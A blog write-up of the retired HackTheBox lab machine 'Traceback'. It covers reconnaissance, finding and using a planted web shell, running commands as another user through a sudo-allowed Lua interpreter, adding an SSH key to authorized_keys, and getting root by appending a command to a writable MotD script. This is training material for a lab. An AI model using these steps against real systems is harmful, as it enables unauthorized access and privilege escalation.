<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en-us lang=en-us><head>&lt; <title itemprop=name>Traceback :: Sequr (dev)</title>
<script defer language=javascript type=text/javascript src=/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="noodp, noydir"><meta name=googlebot content="noodp, noydir"><link rel=canonical href=https://dev.sequr.be/blog/hackthebox/machine/hackthebox-traceback/ itemprop=url><meta name=url content="https://dev.sequr.be/blog/hackthebox/machine/hackthebox-traceback/"><link rel=icon href=favicon.ico><meta itemprop=name content="Traceback"><meta itemprop=description content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta itemprop=datePublished content="2020-03-18T03:00:00+00:00"><meta itemprop=dateModified content="2020-03-18T03:00:00+00:00"><meta itemprop=wordCount content="1129"><meta itemprop=image content="https://dev.sequr.be/img/htb-traceback.png"><meta itemprop=keywords content="HackTheBox.eu,Xh4H,Machine,Traceback"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://dev.sequr.be/img/htb-traceback.png"><meta name=twitter:title content="Traceback"><meta name=twitter:description content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta property="og:url" content="https://dev.sequr.be/blog/hackthebox/machine/hackthebox-traceback/"><meta property="og:site_name" content="Sequr (dev)"><meta property="og:title" content="Traceback"><meta property="og:description" content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2020-03-18T03:00:00+00:00"><meta property="article:modified_time" content="2020-03-18T03:00:00+00:00"><meta property="article:tag" content="HackTheBox.eu"><meta property="article:tag" content="Xh4H"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Traceback"><meta property="og:image" content="https://dev.sequr.be/img/htb-traceback.png"><meta name=description content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta itemprop=description content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta property="og:updated_time" content="2020-03-18T03:00:00Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dev.sequr.be/sitemap.xml><meta name=apple-mobile-web-app-title content="Sequr (dev)"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><link type=text/css rel=stylesheet href=/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css integrity="sha256-lKM5g2+J8NJfMZgMtrBjHaIeIK8Sgwh0fOROBSXrFu8=" crossorigin=anonymous><style>body{--sidebar-bg-color:#202020;--sidebar-img-border-color:#515151;--sidebar-p-color:#909090;--sidebar-h1-color:#FFF;--sidebar-a-color:#FFF;--sidebar-socials-color:#FFF;--text-color:#222;--bkg-color:#FAF9F6;--post-title-color:#303030;--list-color:#5A5A5A;--link-color:#268BD2;--date-color:#515151;--table-border-color:#E5E5E5;--table-stripe-color:#F9F9F9;--code-color:#000;--code-background-color:#E5E5E5;--code-block-color:#FFF;--code-block-background-color:#272822;--moon-sun-color:#FFF;--moon-sun-background-color:#515151}body.dark-theme{--text-color:#EEE;--bkg-color:#121212;--post-title-color:#DBE2E9;--list-color:#9D9D9D;--link-color:#268BD2;--date-color:#9A9A9A;--table-border-color:#515151;--table-stripe-color:#202020;--code-color:#FFF;--code-background-color:#515151;--code-block-color:#FFF;--code-block-background-color:#272822}body{background-color:var(--bkg-color)}</style></head><body><div class=wrapper><aside class=sidebar><div class="container sidebar-sticky"><div class=light-dark align=right><button class=btn-light-dark title="Toggle light/dark mode"><svg class="moon" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M6 .278a.768.768.0 01.08.858 7.208 7.208.0 00-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527.0 1.04-.055 1.533-.16a.787.787.0 01.81.316.733.733.0 01-.031.893A8.349 8.349.0 018.344 16C3.734 16 0 12.286.0 7.71.0 4.266 2.114 1.312 5.124.06A.752.752.0 016 .278z"/></svg><svg class="sun" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 0zm0 13a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 13zm8-5a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2a.5.5.0 01.5.5zM3 8a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2A.5.5.0 013 8zm10.657-5.657a.5.5.0 010 .707l-1.414 1.415a.5.5.0 11-.707-.708l1.414-1.414a.5.5.0 01.707.0zm-9.193 9.193a.5.5.0 010 .707L3.05 13.657a.5.5.0 01-.707-.707l1.414-1.414a.5.5.0 01.707.0zm9.193 2.121a.5.5.0 01-.707.0l-1.414-1.414a.5.5.0 01.707-.707l1.414 1.414a.5.5.0 010 .707zM4.464 4.465a.5.5.0 01-.707.0L2.343 3.05a.5.5.0 11.707-.707l1.414 1.414a.5.5.0 010 .708z"/></svg></button></div><div class=sidebar-about><h1 class=brand><a href=https://dev.sequr.be/><img src=logo.png alt="brand image">
</a><a href=https://dev.sequr.be/><h1>Sequr (dev)</h1></a></h1><p class=lead>Dev version of sequr.be. This site may break at any time.</p></div><nav><ul class=sidebar-nav><li class=heading><a href=/about/>About</a></li><li class=heading>Blog</li><li class=heading><a href=/privacy/>Privacy</a></li></ul></nav><a target=_blank class=social title="RSS Feed" href=/posts/index.xml><svg width="1em" height="1.2em" viewBox="0 0 1280 1280"><g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentcolor"><path d="M2295 11929c-284-12-642-45-707-65-17-5-18-63-18-1039 0-569 4-1036 8-1039 5-3 74 6 153 19 510 86 1168 95 1789 25 1348-153 2602-677 3670-1531 385-308 820-744 1126-1129 842-1060 1362-2313 1514-3650 70-621 61-1279-25-1789-13-79-22-148-19-153 3-4 471-8 1039-8h1035l5 23c51 225 85 942 67 1419-23 605-77 1044-198 1617-294 14e2-927 2734-1823 3846-1043 1295-2364 2259-3909 2854-1158 447-2451 656-3707 6e2z"/><path d="M2255 7845c-269-25-620-81-667-106-17-9-18-55-18-899 0-706 3-890 13-890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207-107 2267-823 2814-1902 166-327 268-637 330-1001 38-227 48-384 42-662-8-348-44-590-126-831-23-66-41-126-41-132 0-10 184-13 890-13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782-59 703-233 1323-545 1945-481 956-1313 1788-2270 2268-620 310-1239 483-1940 542-165 14-669 10-840-5z"/><path d="M2519 3815c-391-66-725-336-868-703-79-201-96-462-45-677 83-344 338-641 666-774 116-47 205-69 330-80 412-39 811 153 1040 5e2 193 292 240 648 128 981-135 403-492 699-914 757-1e2 14-241 12-337-4z"/></g></svg></a><p class=footnote>&copy; 2019
• <a class="p-name u-url" href=https://sequr.be>DezeStijn</a>
• &lt;a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0&lt;/a></p></div></aside><main class="content container"><div class=post><div class=info><h1 class=post-title><a href=https://dev.sequr.be/blog/hackthebox/machine/hackthebox-traceback/>Traceback</a></h1><div class=headline><div><span>DezeStijn - </span><time datetime=2020-03-18T03:00:00Z class=post-date>March 18, 2020
</time><span>- </span><span class=reading-time><span>6 mins read</span></span></div><ul class=tags><li class=tag-HackTheBox.eu><a href=https://dev.sequr.be/tags/hackthebox.eu>HackTheBox.eu</a></li><li class=tag-Xh4H><a href=https://dev.sequr.be/tags/xh4h>Xh4H</a></li><li class=tag-Machine><a href=https://dev.sequr.be/tags/machine>Machine</a></li><li class=tag-Traceback><a href=https://dev.sequr.be/tags/traceback>Traceback</a></li></ul></div></div><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><h2 id=machine-info>Machine info</h2><p>Traceback [by <a href=https://www.hackthebox.eu/home/users/profile/21439 target=_blank>Xh4H</a>]<br>IP: 10.10.10.181<br>OS: Linux<br>Difficulty: Easy<br>Points: 20<br>Release: 14 Mar 2020</p><h2 id=gain-a-foothold>Gain a foothold</h2><p>As usual we kick off with a nmap scan of the box</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.80 scan initiated Tue Mar 17 22:53:43 2020 as: nmap -v -sC -A -T4 -oA notes/nmap_initial 10.10.10.181</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.181
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.068s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: <span style=color:#e6db74>&#34;Help us&#34;</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Tue Mar 17 22:54:29 2020 -- 1 IP address (1 host up) scanned in 46.20 seconds</span>
</span></span></code></pre></div><p>Ports 22 and 80 are open.
Let’s start with checking the website.</p><figure class=center><img src=/img/htb-traceback-homepage.png alt="Defaced homepage"><figcaption class=center>Defaced homepage</figcaption></figure><p>By the looks of it, our target has already been hacked and had its homepage defaced.</p><p>In the source code of the defaced home page, we find a reference to the use of a web shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!-- Some of the best web shells that you might need ;) --&gt;</span>
</span></span></code></pre></div><p>We combine this info, with the nickname used by the hacker, in an online search.<br>Let&rsquo;s try <code>Xh4H web shell</code>.</p><p>One of the hits leads us to <a href=https://github.com/Xh4H/Web-Shells title="Xh4H / Web-Shells" target=_blank>a Github repository</a>.<br>Note the repo&rsquo;s description: <code>Some of the best web shells that you might need</code></p><p>This repo is a collection of web shells.</p><p>Cloning the repo, we can easily list its contents and create a wordlist.
We can then use this wordlist to check whether our hacker used one of these shells.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone https://github.com/Xh4H/Web-Shells.git
</span></span><span style=display:flex><span>$ ls Web-Shells | tee wordlist-shells.lst
</span></span><span style=display:flex><span>alfa3.php
</span></span><span style=display:flex><span>alfav3.0.1.php
</span></span><span style=display:flex><span>andela.php
</span></span><span style=display:flex><span>bloodsecv4.php
</span></span><span style=display:flex><span>by.php
</span></span><span style=display:flex><span>c99ud.php
</span></span><span style=display:flex><span>cmd.php
</span></span><span style=display:flex><span>configkillerionkros.php
</span></span><span style=display:flex><span>jspshell.jsp
</span></span><span style=display:flex><span>mini.php
</span></span><span style=display:flex><span>obfuscated-punknopass.php
</span></span><span style=display:flex><span>punkholic.php
</span></span><span style=display:flex><span>punk-nopass.php
</span></span><span style=display:flex><span>r57.php
</span></span><span style=display:flex><span>README.md
</span></span><span style=display:flex><span>smevk.php
</span></span><span style=display:flex><span>wso2.8.5.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ gobuster -w wordlist-shells.lst -u http://10.10.10.181/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span>Gobuster v2.0.1              OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Mode         : dir
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url/Domain   : http://10.10.10.181/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads      : <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist     : wordlist-shells.lst
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes : 200,204,301,302,307,403
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout      : 10s
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span>2020/03/23 17:26:38 Starting gobuster
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span>/smevk.php <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Looks like our hacker used the SmEvK_PaThAn Shell.</p><figure class=center><img src=/img/htb-traceback-smevk.png alt="Web shell"><figcaption class=center>Web shell</figcaption></figure><p>We find the login credentials in the <a href=https://github.com/Xh4H/Web-Shells/blob/master/smevk.php title="SmEvK source code" target=_blank>source code</a>.</p><p>The shell contains loads of functionality, one of which is a console.<br>We can use this console to execute commands as the user running the web shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sh data-lang=sh><span style=display:flex><span>$ whoami
</span></span><span style=display:flex><span>webadmin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ pwd
</span></span><span style=display:flex><span>/var/www/html
</span></span></code></pre></div><h2 id=own-user>Own user</h2><p>In the user&rsquo;s home folder, we find a note left by the sysadmin.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat /home/webadmin/note.txt
</span></span><span style=display:flex><span>- sysadmin -
</span></span><span style=display:flex><span>I have left a tool to practice Lua.
</span></span><span style=display:flex><span>I<span style=color:#960050;background-color:#1e0010>&#39;</span>m sure you know where to find it.
</span></span><span style=display:flex><span>Contact me <span style=color:#66d9ef>if</span> you have any question.
</span></span></code></pre></div><p>We also discover that the user can execute a script as this sysadmin.
Using sudo and passing the <code>-u</code> parameter, we can then execute this program.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> webadmin on traceback:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User webadmin may run the following commands on traceback:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>sysadmin<span style=color:#f92672>)</span> NOPASSWD: /home/sysadmin/luvit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sudo /home/sysadmin/luvit 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>sudo: no tty present and no askpass program specified
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Welcome to the <span style=color:#f92672>[</span>0mL<span style=color:#f92672>[</span>0muv<span style=color:#f92672>[</span>0mit<span style=color:#f92672>[</span>0m repl!
</span></span><span style=display:flex><span>&gt; Uncaught exception:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/readline.lua&#34;</span><span style=color:#f92672>]</span>:485: attempt to call method <span style=color:#e6db74>&#39;set_mode&#39;</span> <span style=color:#f92672>(</span>a nil value<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>stack traceback:
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/readline.lua&#34;</span><span style=color:#f92672>]</span>:485: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;readLine&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/repl.lua&#34;</span><span style=color:#f92672>]</span>:198: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;start&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:main.lua&#34;</span><span style=color:#f92672>]</span>:137: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;main&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:init.lua&#34;</span><span style=color:#f92672>]</span>:49: in <span style=color:#66d9ef>function</span> &lt;<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:init.lua&#34;</span><span style=color:#f92672>]</span>:47&gt;
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>C<span style=color:#f92672>]</span>: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;xpcall&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:init.lua&#34;</span><span style=color:#f92672>]</span>:47: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;fn&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/require.lua&#34;</span><span style=color:#f92672>]</span>:310: in <span style=color:#66d9ef>function</span> &lt;<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/require.lua&#34;</span><span style=color:#f92672>]</span>:266&gt;
</span></span></code></pre></div><p>Combining the intel from the sysadmin&rsquo;s note and the tool we&rsquo;ve discovered,
we can assume that <code>luvit</code> is a Lua interpreter.
This could allow us to write scripts, perhaps even gaining access to the sysadmin account?</p><p>Let&rsquo;s write a simple script to test our theory.<br>Note that I use Shared Memory to store my scripts, to avoid polluting the system.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;print(&#34;hello world&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ cat /dev/shm/hello.lua
</span></span><span style=display:flex><span>print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hello world&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>hello world
</span></span></code></pre></div><p>Checking who we&rsquo;re executing scripts as.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;whoami&#34;)&#39;</span> &gt; /dev/shm/hello.lua; sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;1; rm /dev/shm/hello.lua
</span></span><span style=display:flex><span>sysadmin
</span></span></code></pre></div><p>Let&rsquo;s try to find the user&rsquo;s flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;ls ~&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>luvit
</span></span><span style=display:flex><span>user.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;cat ~/user.txt&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>c24<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span><span style=color:#ae81ff>020</span>
</span></span></code></pre></div><p>Don&rsquo;t forget to clean up!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ rm /dev/shm/hello.lua
</span></span></code></pre></div><h2 id=privesc-root>Privesc (root)</h2><p>Let&rsquo;s make it easier to ourselves to work on the box by granting ourselves SSH access.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># On our box</span>
</span></span><span style=display:flex><span>$ ssh-keygen -b <span style=color:#ae81ff>2048</span> -t rsa -C globemarssociety -f ./id_traceback
</span></span><span style=display:flex><span>$ cat ./id_traceback
</span></span><span style=display:flex><span>ssh-rsa AAAAB<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>EitYfvF4f <span style=color:#75715e># copy this to clipboard</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Shell</span>
</span></span><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;echo ssh-rsa AAAAB[...]EitYfvF4f globemarssociety &gt;&gt; /home/sysadmin/.ssh/authorized_keys&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>$ rm /dev/shm/hello.lua
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># On our box</span>
</span></span><span style=display:flex><span>$ ssh -i id_traceback sysadmin@10.10.10.181
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>-------- OWNED BY XH4H  ---------
</span></span><span style=display:flex><span>- I guess stuff could have been configured better ^^ -
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to Xh4H land
</span></span></code></pre></div><p>It looks like the MotD has also been hijacked by the hacker who defaced the website.</p><p>As part of our recon, we look for files writable by our user (sysadmin),
in particular files that are also owned by root.
We find that the Message of the Day (MotD) files can be modified by our user and are owned by root.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sysadmin@traceback:~$ find / -writable 2&gt;/dev/null
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sysadmin@traceback:~$ ls -al /etc/update-motd.d/
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> root sysadmin <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>80</span> root root     <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>16</span> 03:55 ..
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>981</span> Mar <span style=color:#ae81ff>17</span> 19:30 00-header
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>982</span> Mar <span style=color:#ae81ff>17</span> 19:30 10-help-text
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin <span style=color:#ae81ff>4264</span> Mar <span style=color:#ae81ff>17</span> 19:30 50-motd-news
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>604</span> Mar <span style=color:#ae81ff>17</span> 19:30 80-esm
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>299</span> Mar <span style=color:#ae81ff>17</span> 19:30 91-release-upgrade
</span></span></code></pre></div><p>We add a line to the MotD which will print the content of <code>/root/root.txt</code>
which is where we usually find the root flag.</p><p>Note that to exploit this, we&rsquo;ll have to be quick.
There&rsquo;s a script that resets the MotD to it&rsquo;s default value after a user logged in
(You can see this running pspy for a while and logging in from a 2nd session).<br>So make sure you have a second terminal window open, ready to SSH into the box
as soon as you&rsquo;ve executed the first command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># In our current SSH shell</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;cat /root/root.txt&#34;</span> &gt;&gt; /etc/update-motd.d/00-header
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># In the 2nd terminal</span>
</span></span><span style=display:flex><span>$ ssh -i id_traceback sysadmin@10.10.10.181
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>-------- OWNED BY XH4H  ---------
</span></span><span style=display:flex><span>- I guess stuff could have been configured better ^^ -
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to Xh4H land 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ccd<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>5d6
</span></span></code></pre></div><p>There we have it :)</p><p>A very pleasant box by <a href=https://www.hackthebox.eu/home/users/profile/21439 target=_blank>Xh4H</a>!</p><hr><div class=footer><a class=previous-post href="https://dev.sequr.be/blog/general/writeups/general-writeups/?ref=footer"><span style=font-weight:700>« Previous</span><br>Challenge write-ups</a><div class=next-post><a href="https://dev.sequr.be/blog/cybersecurity/pihole_vs_phishing/?ref=footer"><span style=font-weight:700>Next »</span><br>Pi-hole vs Phishing</a></div></div></div></main><div class=article-toc><div class=toc-wrapper><h4 id=contents></h4><nav id=TableOfContents><ul><li><a href=#machine-info>Machine info</a></li><li><a href=#gain-a-foothold>Gain a foothold</a></li><li><a href=#own-user>Own user</a></li><li><a href=#privesc-root>Privesc (root)</a></li></ul></nav></div></div></div></body></html>